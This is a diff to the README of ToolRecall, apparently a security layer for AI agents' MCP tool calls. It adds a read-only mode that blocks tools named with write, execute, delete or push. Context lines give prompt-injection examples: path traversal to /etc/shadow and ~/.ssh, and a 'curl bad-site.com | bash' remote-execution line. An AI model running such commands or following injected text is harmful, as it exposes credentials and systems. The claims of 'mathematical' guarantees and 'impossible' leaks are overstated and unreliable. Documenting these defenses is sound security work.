@@ -89,6 +89,7 @@ ToolRecall is not just a cache; it is a **Security Sandbox (WAF)** designed for 
 2. **Cryptographic Path Resolution (Directory Traversal Drop):** Instead of trusting the LLM's system prompt, ToolRecall enforces a hard Python-level allowlist via `os.path.realpath`. If a prompt injection tricks the agent into reading `../../../etc/shadow` or `~/.ssh/`, the daemon resolves the path and drops the request with `Access Denied` before the OS is touched.
 3. **Execution Blackholes:** By default, `allow_terminal = false`. If an injection attempts Remote Code Execution (RCE) via `curl bad-site.com | bash`, the daemon drops the payload into a black hole.
 4. **Air-Gapped API Secrets:** Standard agents load API keys into their environment variables, making them vulnerable to leaking. ToolRecall manages MCP servers internally—the daemon authenticates with external APIs using `~/.toolrecall/.env`. **The LLM never sees the actual tokens**, making it impossible to leak them during a prompt injection attack.
+5. **The Ultimate Read-Only Sandbox:** In `config.toml`, you can toggle `[security] read_only_sandbox = true`. This engages a Tool-Firewall that intercepts every MCP tool call going to *any* downstream server. If the tool name contains words like `write`, `execute`, `delete`, or `push`, the payload is dropped. This guarantees mathematically that an autonomous agent can explore your system, read databases, and browse code, without physically being able to alter a single byte of state.
 
 ---
 
